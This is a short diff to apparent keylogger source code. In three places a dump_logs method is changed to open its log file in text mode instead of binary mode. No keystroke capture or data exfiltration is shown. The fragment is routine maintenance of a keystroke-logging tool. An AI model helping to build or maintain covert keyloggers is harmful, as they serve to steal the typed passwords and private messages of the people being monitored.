@@ -695,7 +695,7 @@ class keylogger():
         return self.frz_status
 
     def dump_logs(self):
-        with open(self.log_file,'rb') as s:
+        with open(self.log_file,'r') as s:
             resp = ''
             data = s.readlines()
             for line in data:
@@ -792,7 +792,7 @@ class keylogger():
         return self.kl_status
 
     def dump_logs(self):
-        with open(self.log_file,'rb') as s:
+        with open(self.log_file,'r') as s:
             resp = ''
             data = s.readlines()
             for line in data:
@@ -893,7 +893,7 @@ class keylogger():
         return self.kl_status
 
     def dump_logs(self):
-        with open(self.log_file,'rb') as s:
+        with open(self.log_file,'r') as s:
             resp = ''
             data = s.readlines()
             for line in data:
